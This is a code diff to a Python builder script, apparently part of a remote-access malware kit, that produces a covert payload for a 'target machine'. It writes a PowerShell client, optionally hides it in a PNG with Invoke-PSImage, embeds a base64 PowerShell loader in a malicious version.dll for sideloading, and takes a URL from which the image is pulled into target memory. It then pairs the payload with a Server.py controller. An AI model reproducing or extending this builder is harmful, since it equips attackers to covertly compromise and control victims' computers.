@@ -67,40 +67,44 @@ class BuildClient(object):
 
     
     def genFullPayload(self):
-        psim = input('To generate a fileless payload, please enter the path to the "Invoke-PsImage" script: ')
-        assert(os.path.isfile(psim))
-        pathToImage = input('Please enter the path to an image to integrate the bytes into the pixels: ')
-        assert(os.path.isfile(pathToImage))
-        psim,pspath = open(psim,'r').read(), os.path.join(self.clPath,'client2.ps1')
+        pspath,pathtovers = os.path.join(self.clPath,'client2.ps1'),os.path.join(
+                    self.clPath,
+                    'Dll5',
+                    'Dll5',
+                    'vers.dll'
+                )
         open(pspath,'w').write(self.__genps1payload__())
-        psim += f'\nInvoke-PSImage -Script "{pspath}" -Out "$env:APPDATA\P16700.png" -Image "{pathToImage}"'
-        open(os.path.join(os.getenv('TEMP'),'09890121233.ps1'),'w').write(psim)
         encpayload = r'''$username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1];$UserID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid;$homepath = (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList\$UserID").ProfileImagePath;'''
-        encpayload += self.cmd(f"powershell -File {os.path.join(os.getenv('TEMP'),'09890121233.ps1')}")
-        encpayload = base64.b64encode(
-            self.cmd(f"powershell -File {os.path.join(os.getenv('TEMP'),'09890121233.ps1')}").replace(
-                os.environ['APPDATA'],'$homepath\AppData\Roaming'
-            ).encode('UTF-16LE')
-        ).decode()
-        verspayload = self.__genVersionDll__(encpayload)
-        open(
-            os.path.join(
-                self.clPath,
-                'Dll5',
-                'Dll5',
-                'dllmain.cpp'
-            ),'w'
-        ).write(verspayload)
-        print(f"The DLL payload is prepared and ready to go! To complete the process, please open the file at \"{os.path.join(self.clPath,'Dll5','Dll5','dllmain.cpp')}\" using Microsoft Visual Studio 20XX. Once you have opened it, build it and provide the output path here. Alternatively, you can also use GCC compiler.")
-        pathtovers = input('-> ')
+        psim = input('To generate a fileless payload, please enter the path to the "Invoke-PsImage" script \n(if you don\'t want to use stenography enter "n"): ')
+        url = "$false"
+        if psim!='n':
+            assert(os.path.isfile(psim))
+            pathToImage = input('Please enter the path to an image to integrate the bytes into the pixels: ')
+            assert(os.path.isfile(pathToImage))
+            psim = open(psim,'r').read()
+            psim += f'\nInvoke-PSImage -Script "{pspath}" -Out "$env:APPDATA\P16700.png" -Image "{pathToImage}"'
+            open(os.path.join(os.getenv('TEMP'),'09890121233.ps1'),'w').write(psim)
+            encpayload += self.cmd(f"powershell -File {os.path.join(os.getenv('TEMP'),'09890121233.ps1')}")
+            encpayload = base64.b64encode(
+                self.cmd(f"powershell -File {os.path.join(os.getenv('TEMP'),'09890121233.ps1')}").replace(
+                    os.environ['APPDATA'],'$homepath\AppData\Roaming'
+                ).encode('UTF-16LE')
+            ).decode()  
+            verspayload = self.__genVersionDll__(encpayload)
+            open(
+                os.path.join(
+                    self.clPath,
+                    'Dll5',
+                    'Dll5',
+                    'dllmain.cpp'
+                ),'w'
+            ).write(verspayload)
+            print(f"The DLL payload is prepared and ready to go! To complete the process, please open the file at \"{os.path.join(self.clPath,'Dll5','Dll5','dllmain.cpp')}\" using Microsoft Visual Studio 20XX. Once you have opened it, build it and provide the output path here. Alternatively, you can also use GCC compiler.")
+            pathtovers = input('-> ')
+            url = input(f'This is the final step! Please upload the image located at $env:APPDATA\P16700.png so that the payload can read and embed it into the target memory.\n-> ')
         versdll = base64.b64encode(open(pathtovers,'rb').read())
-        url = input('This is the final step! Please upload the image located at <path> so that the payload can read and embed it into the target memory.\n-> ')
-        endPath = input('Finished! Please specify the path to output the payload.')
+        endPath = input('Finished! Please specify the path to output the payload: ')
         open(endPath,'w').write(self.__setendPayload__(versdll,url))
         print(f"Please run the following ({endPath}) on the target machine and run Server.py on the server.")
         
-        
-
-
-
 BuildClient().genFullPayload()
